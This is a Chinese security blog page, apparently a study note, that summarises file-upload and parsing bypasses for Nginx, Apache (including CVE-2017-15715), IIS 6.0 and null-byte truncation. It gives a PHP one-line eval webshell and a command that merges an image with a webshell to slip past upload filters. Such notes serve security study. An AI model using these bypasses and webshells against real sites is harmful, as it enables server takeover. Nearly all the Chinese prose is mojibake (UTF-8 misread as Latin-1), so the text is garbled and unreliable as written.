<!DOCTYPE HTML>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta name="keywords" content="æ–‡ä»¶è§£ææ¼æ´æ€»ç»“, æœ‹ä¸åŒ">
    <meta name="baidu-site-verification" content>
    <meta name="google-site-verification" content>
    <meta name="description" content="Nginx è§£ææ¼æ´ç®€ä»‹â€‹    è¯¥æ¼æ´ä¸Nginxå’ŒPHPç‰ˆæœ¬æ— å…³ï¼Œå±äºç”¨æˆ·é…ç½®ä¸å½“é€ æˆçš„è§£ææ¼æ´â€‹    è¯¥Nginxè§£ææ¼æ´æˆå› ä¸ºï¼šæœåŠ¡å™¨å¯èƒ½é”™è¯¯çš„å°†ä»»ä½•ç±»å‹çš„æ–‡ä»¶ä»¥PHPçš„æ–¹å¼è¿›è¡Œè§£æ
åˆ©ç”¨
å…ˆæ¢æ˜æ˜¯NginxæœåŠ¡å™¨
å•ç‹¬æ‰“å¼€ä¸€å¼ è¯¥">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>æ–‡ä»¶è§£ææ¼æ´æ€»ç»“ | æœ‹ä¸åŒBlog</title>
    <link rel="icon" type="image/png" href="/medias/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
    <style type="text/css">
        
    </style>

    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
    <script>
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>

<body>

<header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <!-- <img src="/medias/logo.png" class="logo-img" alt="LOGO">é¦–é¡µlogo -->  
                    
                    <span class="logo-span">æœ‹ä¸åŒBlog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
<ul class="right">
    
    <li class="hide-on-med-and-down">
        <a href="/" class="waves-effect waves-light">
            
            <i class="fa fa-home"></i>
            
            <span>é¦–é¡µ</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/tags" class="waves-effect waves-light">
            
            <i class="fa fa-tags"></i>
            
            <span>æ ‡ç­¾</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/categories" class="waves-effect waves-light">
            
            <i class="fa fa-bookmark"></i>
            
            <span>åˆ†ç±»</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/archives" class="waves-effect waves-light">
            
            <i class="fa fa-archive"></i>
            
            <span>å½’æ¡£</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/about" class="waves-effect waves-light">
            
            <i class="fa fa-user-circle-o"></i>
            
            <span>å…³äº</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/contact" class="waves-effect waves-light">
            
            <i class="fa fa-comments"></i>
            
            <span>ç•™è¨€æ¿</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/friends" class="waves-effect waves-light">
            
            <i class="fa fa-address-book"></i>
            
            <span>å‹æƒ…é“¾æ¥</span>
        </a>
    </li>
    
    <li>
        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
            <i id="searchIcon" class="fa fa-search" title="æœç´¢"></i>
        </a>
    </li>
</ul>

<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">æœ‹ä¸åŒBlog</div>
        <div class="logo-desc">
            
            è¥¿å®‰ç†å·¥å¤§å­¦
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li>
            <a href="/" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-home"></i>
                
                é¦–é¡µ
            </a>
        </li>
        
        <li>
            <a href="/tags" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-tags"></i>
                
                æ ‡ç­¾
            </a>
        </li>
        
        <li>
            <a href="/categories" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-bookmark"></i>
                
                åˆ†ç±»
            </a>
        </li>
        
        <li>
            <a href="/archives" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-archive"></i>
                
                å½’æ¡£
            </a>
        </li>
        
        <li>
            <a href="/about" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-user-circle-o"></i>
                
                å…³äº
            </a>
        </li>
        
        <li>
            <a href="/contact" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-comments"></i>
                
                ç•™è¨€æ¿
            </a>
        </li>
        
        <li>
            <a href="/friends" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-address-book"></i>
                
                å‹æƒ…é“¾æ¥
            </a>
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/P1Kaju" class="waves-effect waves-light" target="_blank">
                <i class="fa fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>

        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/P1Kaju" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>


<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('è¯·è¾“å…¥è®¿é—®æœ¬æ–‡ç« çš„å¯†ç ')).toString(CryptoJS.enc.Hex)) {
                alert('å¯†ç é”™è¯¯ï¼Œå°†è¿”å›ä¸»é¡µï¼');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
    <div class="container">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <div class="description center-align post-title">
                        æ–‡ä»¶è§£ææ¼æ´æ€»ç»“
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



<main class="container content">

    
    <!-- æ–‡ç« å†…å®¹è¯¦æƒ… -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                        <a href="/tags/Webæ¼æ´/" target="_blank">
                            <span class="chip bg-color">Webæ¼æ´</span>
                        </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fa fa-bookmark fa-fw icon-category"></i>
                        
                        <a href="/categories/Webæ¼æ´/" class="post-category" target="_blank">
                            Webæ¼æ´
                        </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                <div class="post-date info-break-policy">
                    <i class="fa fa-calendar-minus-o fa-fw"></i>å‘å¸ƒæ—¥æœŸ:&nbsp;&nbsp;
                    2019-09-15
                </div>

                <div class="post-author info-break-policy">
                    <i class="fa fa-user-o fa-fw"></i>ä½œè€…:&nbsp;&nbsp;
                    
                    æœ‹ä¸åŒ
                    
                </div>

                
                
                <div class="info-break-policy">
                    <i class="fa fa-file-word-o fa-fw"></i>æ–‡ç« å­—æ•°:&nbsp;&nbsp;
                    3.1k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="fa fa-clock-o fa-fw"></i>é˜…è¯»æ—¶é•¿:&nbsp;&nbsp;
                    11 åˆ†
                </div>
                
                

                
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="Nginx-è§£ææ¼æ´"><a href="#Nginx-è§£ææ¼æ´" class="headerlink" title="Nginx è§£ææ¼æ´"></a>Nginx è§£ææ¼æ´</h2><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>â€‹    è¯¥æ¼æ´ä¸Nginxå’ŒPHPç‰ˆæœ¬æ— å…³ï¼Œå±äºç”¨æˆ·é…ç½®ä¸å½“é€ æˆçš„è§£ææ¼æ´<br>â€‹    è¯¥Nginxè§£ææ¼æ´æˆå› ä¸ºï¼šæœåŠ¡å™¨å¯èƒ½é”™è¯¯çš„å°†ä»»ä½•ç±»å‹çš„æ–‡ä»¶ä»¥PHPçš„æ–¹å¼è¿›è¡Œè§£æ</p>
<h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul>
<li>å…ˆæ¢æ˜æ˜¯NginxæœåŠ¡å™¨</li>
<li>å•ç‹¬æ‰“å¼€ä¸€å¼ è¯¥ç½‘ç«™çš„å›¾ç‰‡ï¼ŒurlååŠ ä¸Šå­—ç¬¦ä¸²â€œ/.phpâ€<br>å€˜è‹¥æ²¡æœ‰æç¤º404ï¼Œè€Œæ˜¯å‡ºç°äº†ä¸€å †ä¹±ç ï¼Œè¯æ˜è¯¥æ¼æ´å­˜åœ¨ ### 3ï¼šæ¼æ´åˆ©ç”¨</li>
<li>ä¸Šä¼ å›¾ç‰‡webshellï¼Œæµ‹è¯•</li>
</ul>
<p><img src="https://i.loli.net/2019/09/01/GTE7eAwyVdYN4tF.png" alt="image.png"></p>
<h2 id="Apache-mime-è§£ææ¼æ´"><a href="#Apache-mime-è§£ææ¼æ´" class="headerlink" title="Apache mime è§£ææ¼æ´"></a>Apache mime è§£ææ¼æ´</h2><h4 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>ApacheæœåŠ¡å™¨è§£ææ–‡ä»¶æ£€æŸ¥åç¼€åæ—¶ï¼Œä»å³å¾€å·¦æ£€æŸ¥ï¼Œé‡åˆ°å®ƒä¸è®¤è¯†çš„åç¼€åè·³è¿‡ä½¿ç”¨å‰ä¸€ä¸ªåç¼€åã€‚ä¾‹å¦‚<code>1.php.cvb</code>æ–‡ä»¶ï¼Œå°†ä¼šè¢«è§£æä¸ºPHPæ–‡ä»¶ï¼Œè¯¥æ¼æ´å­˜åœ¨äºä½¿ç”¨moduleæ¨¡å¼ä¸phpç»“åˆçš„ç‰ˆæœ¬ä¸­ ï¼ŒApacheä½ç‰ˆæœ¬ä¸­è¾ƒå¸¸è§ï¼Œå¦‚ä½äº2.0.65çš„2.0.xç³»åˆ—ã€‚</p>
<h4 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>å°†phpçš„webshellé‡å‘½åä¸º<code>XXX.php.rar</code> å°è¯•ä¸Šä¼ ï¼Œä¸Šä¼ æˆåŠŸåï¼Œæ‰§è¡Œå‘½ä»¤æµ‹è¯•</p>
<p><img src="https://i.loli.net/2019/09/01/a7JOymKqgZGow3R.png" alt="image.png"></p>
<h2 id="Apacheè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰"><a href="#Apacheè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰" class="headerlink" title="Apacheè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰"></a>Apacheè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰</h2><h4 id="ç®€ä»‹-2"><a href="#ç®€ä»‹-2" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>â€‹    åœ¨Apacheçš„é»˜è®¤é…ç½®ä¸­ç”¨æ­£åˆ™æ¥åŒ¹é…åç¼€è¿›è¡Œphpè§£æï¼Œè€Œå…³é”®é—®é¢˜å°±å‡ºç°åœ¨æ­£åˆ™åŒ¹é…ä¸­çš„$ä¸Šï¼Œå½“è®¾ç½®äº†ä¸Šä¼ çš„é»‘åå•ï¼Œåœ¨è®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±æ€§çš„æ¡ä»¶ä¸‹ï¼Œ$è¿˜ä¼šåŒ¹é…åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ¢è¡Œç¬¦ï¼Œæ‰€ä»¥å½“ä¸Šä¼ çš„æ–‡ä»¶åç¼€ååå¢åŠ ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œåˆ™å¯ä»¥ç»•è¿‡é»‘åå•ï¼Œè¢«å½“åšPHPè¿›è¡Œè§£æã€‚</p>
<ul>
<li>â‘ ï¼šä¸Šä¼ PHPæ–‡ä»¶ï¼ŒæŠ¥é”™æç¤ºä¸Šä¼ æ–‡ä»¶ç±»å‹ä¸å…è®¸</li>
<li>â‘¡ï¼šå†æ¬¡ä¸Šä¼ ï¼ŒæŠ“åŒ…ï¼Œé€šè¿‡HEX ç¼–ç åœ¨.p  hpåç¼€åé¢åŠ ä¸€ä¸ª/x0aï¼Œå³æ¢è¡Œç¬¦ï¼Œä¸Šä¼ æˆåŠŸã€‚</li>
</ul>
<h2 id="HTTPå¤´æ£€æµ‹ç»•è¿‡"><a href="#HTTPå¤´æ£€æµ‹ç»•è¿‡" class="headerlink" title="HTTPå¤´æ£€æµ‹ç»•è¿‡"></a>HTTPå¤´æ£€æµ‹ç»•è¿‡</h2><h4 id="ç®€ä»‹-3"><a href="#ç®€ä»‹-3" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>å¯¼è‡´è¯¥æ¼æ´çš„åŸå› åœ¨äºä»£ç ä½œè€…æ²¡æœ‰å¯¹è®¿å®¢æäº¤çš„æ•°æ®è¿›è¡Œæ£€éªŒæˆ–è€…è¿‡æ»¤ä¸ä¸¥ï¼Œç¨‹åºå‘˜åœ¨åˆ¤æ–­è®¿å®¢æäº¤çš„æ•°æ®æ—¶ï¼Œåˆ¤æ–­ä»£ç åªåˆ¤æ–­httpå¤´ä¿¡æ¯é‡Œçš„æ–‡ä»¶ç±»å‹æˆ–è€…æ£€æµ‹æ–‡ä»¶çš„æ‰©å±•åæ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦åˆæ³•ï¼Œå¯¼è‡´è®¿å®¢æäº¤ä¿®æ”¹è¿‡çš„httpå¤´ä¿¡æ¯ç»•è¿‡åˆ¤æ–­ä¸Šä¼ ï¼Œé€ æˆæ­¤æ¼æ´</p>
<h4 id="æ¢æµ‹"><a href="#æ¢æµ‹" class="headerlink" title="æ¢æµ‹"></a>æ¢æµ‹</h4><p>å…ˆä¸Šä¼ PHPæ–‡ä»¶ï¼Œä¸Šä¼ å¤±è´¥ï¼Œå°†è¯¥PHPæ–‡ä»¶åç¼€åæ”¹ä¸ºjpgï¼ŒæˆåŠŸä¸Šä¼ ï¼Œåˆ™å­˜åœ¨è¯¥æ¼æ´</p>
<h4 id="åˆ©ç”¨-2"><a href="#åˆ©ç”¨-2" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>æŠ“åŒ…ï¼Œä¿®æ”¹Content-Typeï¼Œå°†<code>Content-Type: application/octet-stream</code>ä¿®æ”¹ä¸º<code>Content-Type: image/jpeg</code></p>
<p><img src="https://i.loli.net/2019/09/01/WrBeXfoiMdRc1AL.png" alt="image.png"></p>
<h2 id="æ‰©å±•åæ£€æµ‹ç»•è¿‡"><a href="#æ‰©å±•åæ£€æµ‹ç»•è¿‡" class="headerlink" title="æ‰©å±•åæ£€æµ‹ç»•è¿‡"></a>æ‰©å±•åæ£€æµ‹ç»•è¿‡</h2><h4 id="ç®€ä»‹-4"><a href="#ç®€ä»‹-4" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>ç¨‹åºåœ¨åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ—¶ï¼Œé€šè¿‡æ£€æµ‹æ–‡ä»¶çš„æ‰©å±•åæ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºå¯æ‰§è¡Œè„šæœ¬åï¼Œå¦‚æœåªè®¾ç½®äº†é»‘åå•ï¼Œå¯¼è‡´è®¿å®¢æäº¤å¯æ‰§è¡Œæ–‡ä»¶çš„æ‰©å±•åä¸åœ¨é»‘åå•ç±»å‹é‡Œï¼Œç»•è¿‡åˆ¤æ–­ä¸Šä¼ ï¼Œé€ æˆæ­¤æ¼æ´ã€‚</p>
<h4 id="æ¢æµ‹-1"><a href="#æ¢æµ‹-1" class="headerlink" title="æ¢æµ‹"></a>æ¢æµ‹</h4><p>å…ˆä¸Šä¼ æœåŠ¡å™¨æ”¯æŒçš„è„šæœ¬è¯­è¨€çš„æ–‡ä»¶ï¼Œä¸Šä¼ ä¸é€šè¿‡ï¼Œæç¤ºä¸å…è®¸ä¸Šä¼ aspæ–‡ä»¶æˆ–phpæ–‡ä»¶ç­‰ï¼Œä¿®æ”¹åç¼€åé‡æ–°ä¸Šä¼ ï¼Œä¸Šä¼ æˆåŠŸï¼Œå³å¯è¯æ˜å­˜åœ¨è¯¥æ¼æ´</p>
<h4 id="åˆ©ç”¨-3"><a href="#åˆ©ç”¨-3" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul>
<li>â‘ ï¼šæ‰¾é»‘åå•æ‰©å±•åçš„æ¼ç½‘ä¹‹é±¼ - æ¯”å¦‚asaå’Œcerä¹‹ç±»</li>
<li>â‘¡ï¼šå¯èƒ½å­˜åœ¨å¤§å°å†™ç»•è¿‡æ¼æ´ - æ¯”å¦‚ aSp å’Œ pHp ä¹‹ç±»</li>
<li>â‘¢ï¼šç‰¹åˆ«æ–‡ä»¶åæ„é€ <br>æ¯”å¦‚å‘é€çš„httpåŒ…é‡ŒæŠŠæ–‡ä»¶åæ”¹æˆ <code>help.asp.</code>æˆ– <code>help.asp_</code>(ä¸‹åˆ’çº¿ä¸ºç©ºæ ¼)ï¼Œè¿™ç§å‘½åæ–¹å¼åœ¨ windows ç³»ç»Ÿé‡Œæ˜¯ä¸è¢«å…è®¸çš„ï¼Œæ‰€ä»¥éœ€è¦åœ¨ burp ä¹‹ç±»é‡Œè¿›è¡Œä¿®æ”¹ï¼Œç„¶ åç»•è¿‡éªŒè¯åï¼Œä¼šè¢« windows ç³»ç»Ÿè‡ªåŠ¨å»æ‰åé¢çš„ç‚¹å’Œç©ºæ ¼ã€‚</li>
<li>â‘£ï¼šåç¼€åä¿®æ”¹ä¸ºAspæˆåŠŸä¸Šä¼ ï¼Œå¯èœåˆ€è¿æ¥</li>
</ul>
<p><img src="https://i.loli.net/2019/09/01/Wtn9s2dcwvmeYfo.png" alt="image.png"></p>
<h2 id="æ£€æµ‹æ–‡ä»¶å¤´ç»•è¿‡"><a href="#æ£€æµ‹æ–‡ä»¶å¤´ç»•è¿‡" class="headerlink" title="æ£€æµ‹æ–‡ä»¶å¤´ç»•è¿‡"></a>æ£€æµ‹æ–‡ä»¶å¤´ç»•è¿‡</h2><h4 id="ç®€ä»‹-5"><a href="#ç®€ä»‹-5" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>ä¸Šä¼ ç¨‹åºåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å¯ä»¥ä¸Šä¼ çš„æ–¹æ³•æ˜¯æ£€æµ‹æ–‡ä»¶ç±»å‹ï¼Œä¸€æ—¦æ–‡ä»¶ç±»å‹åœ¨ç™½åå•å†…ï¼Œå³å¯ä¸Šä¼ æˆåŠŸã€‚</p>
<h4 id="åˆ©ç”¨-4"><a href="#åˆ©ç”¨-4" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul>
<li>â‘ ï¼šç®€å•ç²—æš´æ³•ï¼šå°†åŸæ¥çš„webshellä¸€å¥è¯ä¿®æ”¹æ–‡ä»¶å¤´<br>ä¾‹ï¼š<code>GIF89a &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code></li>
<li>â‘¡ï¼šå›¾ç‰‡å’Œwebshellåˆæˆï¼š<code>copy XX.jpg/b+XX.php/a XXX.php</code></li>
</ul>
<p><img src="https://i.loli.net/2019/09/01/WCiZlOIwj4gEJBM.png" alt="image.png"></p>
<h2 id="æœ¬åœ°JSæ£€æµ‹ç»•è¿‡"><a href="#æœ¬åœ°JSæ£€æµ‹ç»•è¿‡" class="headerlink" title="æœ¬åœ°JSæ£€æµ‹ç»•è¿‡"></a>æœ¬åœ°JSæ£€æµ‹ç»•è¿‡</h2><p>æœ¬åœ°JSæ£€æµ‹ä¸Šä¼ æ–‡ä»¶åç¼€ï¼Œè®¾ç½®äº†ç™½åå•ï¼Œå¯é€šè¿‡ç¦ç”¨JSçš„æ–¹æ³•ï¼Œç»•è¿‡ä¸Šä¼ ã€‚</p>
<ul>
<li>æ³¨ï¼šä¸€èˆ¬åœ¨ä¸Šä¼ æˆ–è€…æ£€æµ‹è¾“å…¥å­—ç¬¦æ˜¯å¦éæ³•ååˆ†å¿«é€Ÿæ—¶ï¼Œä¾‹å¦‚åˆšè¾“å®Œå°±æŠ¥é”™ï¼Œå¾ˆæœ‰å¯èƒ½å°±æ˜¯æœ¬åœ°æ£€æµ‹<br>ç«ç‹JS ç¦ç”¨çš„æ–¹æ³•ï¼š</li>
<li>åœ°å€æ è¾“å…¥<code>about:config</code></li>
<li>å›è½¦åç‚¹æˆ‘å·²äº†è§£æ­¤é£é™©</li>
<li>æœç´¢æ ï¼Œæœç´¢<code>javascript.enabled</code></li>
<li>åŒå‡»å³å¯ç¦ç”¨æˆ–æ‰“å¼€</li>
</ul>
<p>æˆ–è€…</p>
<ul>
<li>å…ˆå°†ä¸Šä¼ çš„æ–‡ä»¶æ”¹æˆåˆç†çš„åç¼€ï¼Œä½¿ç”¨BurpæŠ“åŒ…ä¿®æ”¹åç¼€åä¸ºè§£æçš„æ–‡ä»¶ã€‚</li>
</ul>
<h2 id="iis6-0è§£ææ¼æ´"><a href="#iis6-0è§£ææ¼æ´" class="headerlink" title="iis6.0è§£ææ¼æ´"></a>iis6.0è§£ææ¼æ´</h2><h3 id="æ–‡ä»¶åè§£æ"><a href="#æ–‡ä»¶åè§£æ" class="headerlink" title="æ–‡ä»¶åè§£æ"></a>æ–‡ä»¶åè§£æ</h3><h4 id="ç®€ä»‹-6"><a href="#ç®€ä»‹-6" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>ç½‘ç«™ä¸Šä¼ å›¾ç‰‡çš„æ—¶å€™ï¼Œå°†ç½‘é¡µæœ¨é©¬æ–‡ä»¶çš„åå­—æ”¹æˆ<code>*.asp;.jpg</code>ï¼Œä¹ŸåŒæ ·ä¼šè¢«IISå½“ä½œaspæ–‡ä»¶æ¥è§£æå¹¶æ‰§è¡Œã€‚è¯¥æ–‡ä»¶å¯ä»¥è¢«å½“ä½œaspæ–‡ä»¶è§£æå¹¶æ‰§è¡Œ</p>
<h4 id="åˆ©ç”¨-5"><a href="#åˆ©ç”¨-5" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul>
<li>é¦–å…ˆåˆ¤æ–­è¯¥ç½‘ç«™æœåŠ¡å™¨ä¸ºIISï¼Œæ“ä½œç³»ç»Ÿæ˜¯windows server</li>
<li>åœ¨å…è®¸ä¸Šä¼ çš„ä½ç½®ï¼Œæµ‹è¯•å‘ç°åªå…è®¸ä¸Šä¼ å›¾ç‰‡</li>
<li>å°†asp å°é©¬åç¼€åä¿®æ”¹ <code>XX.asp;.jpg</code>ä¸Šä¼ </li>
</ul>
<h3 id="aspæ–‡ä»¶å¤¹è§£æ"><a href="#aspæ–‡ä»¶å¤¹è§£æ" class="headerlink" title="*.aspæ–‡ä»¶å¤¹è§£æ"></a>*.aspæ–‡ä»¶å¤¹è§£æ</h3><h4 id="ç®€ä»‹-7"><a href="#ç®€ä»‹-7" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>IISæœåŠ¡å™¨ï¼Œåœ¨ç½‘ç«™ä¸‹å»ºç«‹æ–‡ä»¶å¤¹çš„åå­—ä¸º<code>*.aspã€*.asa</code>çš„æ–‡ä»¶å¤¹ï¼Œå…¶ç›®å½•å†…çš„ä»»ä½•æ‰©å±•åçš„æ–‡ä»¶éƒ½è¢«IISå½“ä½œaspæ–‡ä»¶æ¥è§£æå¹¶æ‰§è¡Œã€‚</p>
<h4 id="åˆ©ç”¨-6"><a href="#åˆ©ç”¨-6" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>åœ¨è®¿é—®è¯¥ç½‘ç«™æ—¶ï¼Œä¸€æ—¦å¯ä»¥ä¸Šä¼ æ–‡ä»¶çš„é¡µé¢åœ°å€æ æœ‰ç±»ä¼¼<code>http:// ***/*.asp/***</code>æ—¶ï¼Œå³å­˜åœ¨*.aspæ–‡ä»¶å¤¹ï¼Œåˆ™å¯èƒ½å­˜åœ¨è¯¥æ¼æ´ï¼Œå°†webshellæ–‡ä»¶åç¼€åä¿®æ”¹ä¸ºå¯ä¸Šä¼ çš„åç¼€ç±»å‹ï¼Œä¸Šä¼ æˆåŠŸåèœåˆ€è¿æ¥å³å¯ã€‚</p>
<h2 id="00ç©ºå­—ç¬¦æˆªæ–­"><a href="#00ç©ºå­—ç¬¦æˆªæ–­" class="headerlink" title="%00ç©ºå­—ç¬¦æˆªæ–­"></a>%00ç©ºå­—ç¬¦æˆªæ–­</h2><h4 id="ç®€ä»‹-8"><a href="#ç®€ä»‹-8" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>ç”¨aspå†™å…¥æ–‡ä»¶æ—¶ï¼Œå¦‚æœæ–‡ä»¶åå­—é‡Œæ’å…¥äº† NULLå­—èŠ‚ï¼Œé‚£ä¹ˆNULLå­—èŠ‚åé¢çš„å­—ç¬¦å°±ä¼šè¢«å¿½ç•¥ã€‚ä¾‹å¦‚æ­£å¸¸çš„æ–‡ä»¶è·¯å¾„123.jpg ,å½“123.jpg çš„åå­—æ”¹æˆ<code>123.aspNULL.jpg</code> åˆ™å†™å…¥çš„æ–‡ä»¶å®é™…æ˜¯<code>123.asp</code>ã€‚ å¦‚æœaspç¨‹åºNULLå­—èŠ‚å¯ä»¥æ’å…¥åˆ°æ–‡ä»¶åçš„å‚æ•°é‡Œå¹¶ä¸”æ²¡æœ‰è¿›è¡Œå®‰å…¨çš„è¿‡æ»¤ï¼Œå°±å½¢æˆäº†NULLå­—èŠ‚è·¯å¾„æˆªæ–­æ¼æ´ã€‚</p>
